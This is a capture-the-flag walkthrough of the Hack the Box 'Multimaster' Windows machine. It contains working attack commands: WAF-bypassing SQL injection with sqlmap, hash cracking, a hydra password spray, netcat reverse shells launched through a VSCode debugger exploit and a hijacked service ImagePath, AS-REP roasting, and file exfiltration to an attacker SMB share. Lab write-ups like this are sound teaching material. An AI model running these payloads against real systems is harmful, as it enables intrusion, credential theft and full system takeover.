+++
author = "Nick"
categories = ["hack the box", "Insane", "windows", "python", "sqli", "WAF", "unicode", "burpsuite", "hydra", "api", "sqlmap", "hashcat", "evil-winrm", "Windows Services"]
date = 2020-04-20T19:42:23Z
description = ""
draft = false
thumbnail = "/images/2020/04/Annotation-2020-04-20-152914.png"
slug = "hack-the-box-multimaster"
summary = "Hey everyone, today we are tackling the Hack the Box machine - Multimaster. This is a Windows box with an Insane difficulty rating! Let's dive in!"
tags = ["hack the box", "Insane", "windows", "python", "sqli", "WAF", "unicode", "burpsuite", "hydra", "api", "sqlmap", "hashcat", "evil-winrm", "Windows Services"]
title = "Hack the Box - Multimaster"

+++


Hey everyone, today we are tackling the Hack the Box machine - Multimaster. This is a Windows box with an Insane difficulty rating! Let's dive in!

As usual, we start with our `nmap`: `nmap -sC -sV -p- -oA allscan 10.10.10.179`

Here are our results:
```
Nmap scan report for 10.10.10.179
Host is up (0.045s latency).
Not shown: 65513 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-20 19:44:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2020-04-20T19:46:20+00:00
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2020-03-08T09:52:26
|_Not valid after:  2020-09-07T09:52:26
|_ssl-date: 2020-04-20T19:46:59+00:00; +9m50s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49744/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/20%Time=5E9DF938%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h33m50s, deviation: 3h07m50s, median: 9m50s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2020-04-20T12:46:20-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-20T19:46:23
|_  start_date: 2020-04-20T00:16:29

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 624.03 seconds
```

As we can see, it looks like a pretty standard Windows server setup. We get the domain name from the scan as well as a hostname. We'll add these to our hosts file and head over to see what might be hosted on port 80.

We see land on a page that is called the Employee Hub.

![](/images/2020/04/image-62.png)

Before we tart poking around the source of this page, let's kick off a `gobuster` to see what we might be able to find.

Command:
`gobuster dir -u multimaster.megacorp.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -s 200,302`

In this case we're specifying the `-s` to only show codes for 200 and 302, otherwise we are flooded with 403.

We'll start browsing the site to see what type of information we can find. When we click on the 'Colleague Finder' We are given a list of users with email. We'll save these names and emails and add them to a list. Once we have them in a list it looks like this:

![](/images/2020/04/image-63.png)

We want to clean that up we delete all the lines with spaces in them.

Command:
```cat users.txt | sed '/.*\ .*/g' | sed '/^$/d' | sed '/CEO/d' | sed '/MinatoTW/d' | sed '0,/egre55/{/egre55/d};' > email.lst```

Then we can create a file with just usernames in it with the following

Command:
`cat email.lst | sed -r 's/.{13}$//' > username.lst`

Now that we have our user list cleaned up we can take a peek at what's is happening behind the scenes. We'll load up `Burpsuite` and start listening on our `POST` requests.

When we look at the request on the search page, we see that the `POST` is sent to `/api/getColleagues`. The `/api` url is something we might want to fuzz as well.

![](/images/2020/05/image-68.png)

If we send this request to `repeater` inside `Burpsuite`, we can start fuzzing it. Sending special characters to the field yeilds some interesting responses. When we send `'` we get a 403, when we send a `*` we get nothing back. If we send a `%` we get everyone back. This would lead you to believe there is some kind of potential `SQL injection` here. Another thing of note is we often get back just dead brackets `[]` So there could be some kind of ingress / egress filtering happening. Below is a small clip showing that we can use some [basic WAF bypass techniques](https://medium.com/@Pentestit_ru/bypassing-waf-4cfa1aad16bf) to show there does seem to be some kind of WAF.

![](/images/2020/05/multimaster_waf.gif)

While doing research on this, I came accross [this resource](https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/) that suggested using `\u` to send Unicode in a Hex format.

![](/images/2020/05/image-69.png)

This seems to give us a valid value back. Luckily for us, `SQLMap` provides a way for us to create what's called a `Tamper Script` to fuzz / inject this request. 

We need to save the current request we have in `BurpSuite` and repaced the unicode in the JSON with a `%`. This tell `SQLMap` to fuzz the field. We also need to give it a delay to bypass whatever WAF is happening.

Command:
`sqlmap -r request.txt --tamper charunicodeescape --dbs -delay 3`



We finally are able to start exploring the DB structure. We can spend time to find the tables we want and extract the hashes. We finally get them as well as a list of usernames. We see that some of the hashes are duplicate, so we actually only have 4 hashes, we'll send to `hashcat`.

Command:
`hashcat-m 17900 -D 1 -a 0 -n 10 .\hashes.txt .\rockyou.txt -o out.txt —force`

I run `hashcat` on my Windows machine, so you're command might be slightly different.

That runs and we have three matches:

![](/images/2020/05/image-70.png" caption=")

Now we have a list of passwords and a list of users, but when we run them nothing matches. It looks like we'll need to find another way to enumerate users within the domain. Research lead me [here](https://nest.parrot.sh/packages/tools/metasploit-framework/blob/e69624a76d4a3b6c334e051d11b55c3d7e4d85c5/modules/auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli.rb) since I knew there was already a `Metasploit` module for AD enumeration via SQL and SQLi. What's important here is that we can see on line 153 the SQL command `Metasploit` runs to enumerate Domain  SID. So we can combine our knowledge of the SQL statment used to craft an SQL Injection to obtain the Domain Admin RID. Eventually we create the following injection:

Command:
`-' union select 1,2,3,4,(select (select stuff(upper(sys.fn_varbintohexstr((SELECT USER_SID('MEGACORP\Domain Admins')))), 1, 2, '')))-- -`

Now we need to encode it. I used [this site](https://onlineutf8tools.com/convert-utf8-to-hexadecimal) to format the string intially. Then a quick find and replace (Find: 0x Replace with: \u00) to format it appropriately. We send it to repeater in `Burpsuite` and get our RID back!

![](/images/2020/05/image-71.png)

Now that we know the Domain RID we can determine the SID. The RID is the base for all of the SID's on the domain. The first 48 bytes of the RID above gives us our base SID: `0x0105000000000005150000001C00D1BCD181F1492BDFC236`. We can use it to enumerate users and groups based on [this module](https://nest.parrotsec.org/packages/tools/metasploit-framework/-/blob/e69624a76d4a3b6c334e051d11b55c3d7e4d85c5/modules/auxiliary/admin/mssql/mssql_enum_domain_accounts.rb). We modify our SQL statment to be:

Command:
`-' union select 1,2,3,4,SUSER_SNAME(0x0105000000000005150000001C00D1BCD181F1492BDFC23600020000)-- -`

When we run it, sure enough we get back the group associated - Domain Admins, as expected.

![](/images/2020/05/image-72.png)

Now our PoC works, we just need to wrap it up into something more efficient and repeat the process over and over. Under 'Manually Enumerating Domains' on [this resource](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/), we are told the process we need to follow to enumerate every domain user.

This is done best in python. Here's a link to my script. After we run it, these are the results we get:

![](/images/2020/05/image-75.png)

Awesome, now we have a list of usernames to append to our username listing. We can now retry a spray against the domain with these new users added to the list.

Command:
`hydra -L username.lst -P passwords 10.10.10.179 smb`

![](/images/2020/05/image-76.png)

We get a matching set! Now we can use `Evil-WinRM` to log in as this user.

Command:
`Evil-WinRM -i multimaster.megacorp.local -u tushikikatomo -p finance1`

We get connected and download our User.txt flag! Now that we are on the inside we need to start enumerating internally. For windows machines I like to run `WinPEAS` as well as `Bloodhound`. First we'll upload our [`SharpHound` executatble](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe) and run it.

Commands:
`upload ~/Tools/SharpHound.exe`
`.\SharpHound.exe`

![](/images/2020/06/image.png)

We'll download the output from `SharpHound` then we'll upload `winPEAS` the same way.

Command:
`download 20200601075532_BloodHound.zip`

Commands:
`upload ~/Tools/winPEAS.bat`
`.\winPEAS.bat`

WinPEAS didn't return much of anything. Once we load the data into BloodHound, we can start to view the data visually. We will issue the following custom query:

`Match (n:Group) WHERE n.name CONTAINS "" return n`

This will return all the groups in the domain. This will allow us to inspect them and see the relationships, if any, between other objects.

![](/images/2020/06/image-1.png)

As we sift through the groups, we see one noted as `Developers` with 4 direct members.

![](/images/2020/06/image-2.png)

What is of interest here is we have Jorden's account with also has haccess to the `Server Operators` group.

![](/images/2020/06/image-3.png)

It would seem like this could be our path forward but how. We'll need to enumerate further. Our `winPEAS` results weren't that great but that can often be the case when permissions are lacking. I generally do a second round of enumeration on every box by hand for missing links. In this case, we will issue the `PowerShell` command `get-process` to see what's running on the current system.

![](/images/2020/06/image-4.png)

In this case, we see the process `Code` quite a few times. A [quick google](https://www.file.net/process/code.exe.html) shows us that this is `VSCode`. We can confirm this by heading to `C:\Program Files\` and indeed see `VSCode` listed.

![](/images/2020/06/image-5.png)

Google for `Visual Studio Code CVE` shows that there have been some recent vulnerabilities. [This post](https://iwantmore.pizza/posts/cve-2019-1414.html) in particular is interesting. Now we have two potential vectors here. One using a `Metasploit` payload and creating a port forward of the ports and executing the PoC code listed. Or we can use [this GitHub](https://github.com/taviso/cefdebug) tool. This lets us interact with the debug ports in a malicious way. We can upload this tool as well as `netcat` to get a shell.

Commands:
`upload nc.exe`
`upload cefdebug`

With these two on the system we can use `cefdebug.exe` to check what port might be listening since it's random.

Command:
`.\cefdebug.exe`

![](/images/2020/06/image-6.png)

Now that we know our port, we can issue a remote command like noted in the documentation. The port is changing every 20 seconds or so, so we'll need to create our payload ahead of time so we can be time efficient.

Payload:
```
.\cefdebug.exe --url ws://127.0.0.1:39205/736a1a5e-07c0-40ea-9034-d429746deed2 --code "process.mainModule.require('child_process').exec('cmd.exe /c C:\Users\alcibiades\Documents\nc.exe 10.10.14.143 7777 -e powershell.exe')"
```

When we run it, we get a connection back as `cyork`.

![](/images/2020/06/image-9.png)

Now we need to start enumerating as this user. As we are enumerating we see an interesting DLL and PDB file in the `bin` directory of `wwwroot`.

![](/images/2020/06/image-10.png)

We'll use `copy-item` PowerShell command in conjunction with our own `SMB` server. First we spin up an `SMB` server:

Command:
`impacket-smbserver -smb2support root .`

Next we copy the files to that share.

Command:
`copy-item -Path C:\inetpub\wwwroot\bin\MultimasterAPI.dll -Destination '\\10.10.14.143\root\'`
`copy-item -Path C:\inetpub\wwwroot\bin\MultimasterAPI.pdb -Destination '\\10.10.14.143\root\'`

With some luck we can analyze the PDB and .DLL for some passwords. A quick `strings` on the .dll doesn't give anything. When we `cat` the .dll we see something useful!

![](/images/2020/06/image-11.png)

There is a password string - `D3veL0pM3nT!` Normally, I would open this file with `dotPeek` but this time `cat` got the job done! For those interested, here is it's location within the DLL.

Under the MultimasterAPI.Controllers > HttpResponseMessage:

![](/images/2020/06/image-12.png)

Now with a new password, we can try to connect with it. We weren't able to connect as the user `finder` but we will reuse this password for all users in the development group that we saw above. We are able to log in as `sbauer`.

![](/images/2020/06/image-13.png)

Awesome, more enumeration! We don't find much more in terms of access. We know that we want to gain access to the `Server Operators` group somehow either as `Jorden` or as another entity. In this scenario we want to attempt a `Kerberoast` of the target, but `BloodHound` shows us that no users have the property, `DONT_REQ_PREAUTH`, set accordingly. However, it looks like we actually have the ability to set it!

Command:
`Set-ADAccountControl -Identity jorden -doesnotrequirepreauth $true`

Now with this set, we should be able to use Impackets `GetNPUsers` to obtain a hash.

Command:
`python3 GetNPUsers.py megacorp.local/sbauer:"D3veL0pM3nT!" -dc-ip multimaster.htb -request`

![](/images/2020/06/image-14.png)

Sure enough, it works! We can now take this hash and send it to `hashcat`.

Command:
`.\hashcat64.exe -m 18200 -D 1 -a 0 -n 10 .\jorden.txt .\rockyou.txt -o jorden_out.txt --force`

![](/images/2020/06/image-15.png)

We see a password of `rainforest786`. Now we will login as Jorden!

![](/images/2020/06/image-16.png)

Still no access to our root flag yet! We need to continue to enumerate. This time `winPEAS` does give us what we want right away! We see that we have the ability to modify registry entries of services. Sow e can simply modify a services registry entry so that it will send a connection back to use as System!

![](/images/2020/06/image-18.png)

For this to work, we need a service that is already stopped. All of the tools I would use to check the current running services are denied. So in this case, I did each int he list one at a time....

We are going to exploit the standard [service weakness](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions) like we have in boxes before this.

We'll issue the following command.

Command:
`reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SensorDataService" /v
ImagePath /t REG_EXPAND_SZ /d "C:\tmp\nc.exe 10.10.14.143 6969 -e powershell.exe" /f`

Then we start the service:
`sc.exe start SensorDataService`

![](/images/2020/06/multimaster_root.gif)

Then we get our shell back as System. Box complete!

Hopefully you enjoyed this machine as much as I did. Feel free to send some respect my way on [HTB](https://www.hackthebox.eu/home/users/profile/95635) if you found it helpful!



